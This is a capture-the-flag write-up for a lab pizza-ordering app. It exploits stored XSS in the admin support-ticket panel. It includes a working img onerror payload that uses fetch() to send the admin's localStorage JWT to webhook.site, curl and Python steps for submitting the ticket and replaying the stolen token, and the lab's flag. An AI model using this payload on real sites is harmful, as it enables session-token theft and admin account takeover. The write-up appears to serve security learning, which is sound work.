# CTF Writeup: Cheesy Does It

**Target:** https://lab-1780344039870-xg759w.labs-app.bugforge.io/login  
**Flag:** `bug{5n4zdtMUya5P8PguqgLzuQhsao9Eb9qh}`  
**Vulnerability:** Stored XSS → Admin Token Theft

---

## Recon

The app is a React SPA (pizza ordering site). Pulling the JS bundle revealed all API routes:

- `POST /api/register` / `POST /api/login`
- `GET|POST /api/tickets` / `GET /api/tickets/:id`
- `GET /api/admin/tickets` (admin only)
- `GET /api/admin/flag` (admin only)

The hint said **"Ask support"** — meaning an admin bot automatically reads submitted support tickets.

---

## Vulnerability

The admin ticket panel renders ticket messages using React's `dangerouslySetInnerHTML`:

```js
(0,kt.jsx)("div", { dangerouslySetInnerHTML: { __html: e.message } })
```

This means any HTML/JS in a ticket message executes in the admin's browser — **Stored XSS**.

---

## Exploit

### Step 1 — Register & login

```bash
curl -X POST /api/register -d '{"username":"ctfplayer","email":"ctf@test.com","password":"Password123!"}'
curl -X POST /api/login    -d '{"username":"ctfplayer","password":"Password123!"}'
# → JWT token
```

### Step 2 — Submit XSS payload as a support ticket

```python
xss = '<img src=x onerror="fetch(\'https://webhook.site/UUID?t=\'+encodeURIComponent(localStorage.getItem(\'token\')))">'

requests.post("/api/tickets",
    headers={"Authorization": f"Bearer {USER_TOKEN}"},
    json={"subject": "Help needed", "message": xss}
)
```

### Step 3 — Admin bot visits → token exfiltrated

The bot reads the ticket, the `onerror` fires, and the admin JWT lands on webhook.site:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiIsImlhdCI6...
```

Decoded payload: `{"id": 1, "username": "admin"}`

### Step 4 — Use admin token to get the flag

```bash
curl /api/admin/flag -H "Authorization: Bearer ADMIN_TOKEN"
# → {"flag":"bug{5n4zdtMUya5P8PguqgLzuQhsao9Eb9qh}"}
```

---

## Summary

| Step | Action |
|------|--------|
| 1 | Register user, get JWT |
| 2 | Submit ticket with `<img onerror>` XSS payload |
| 3 | Admin bot triggers XSS, exfiltrates their token |
| 4 | Call `/api/admin/flag` with stolen token |

**Root cause:** Unsanitized user input rendered as raw HTML in the admin panel.
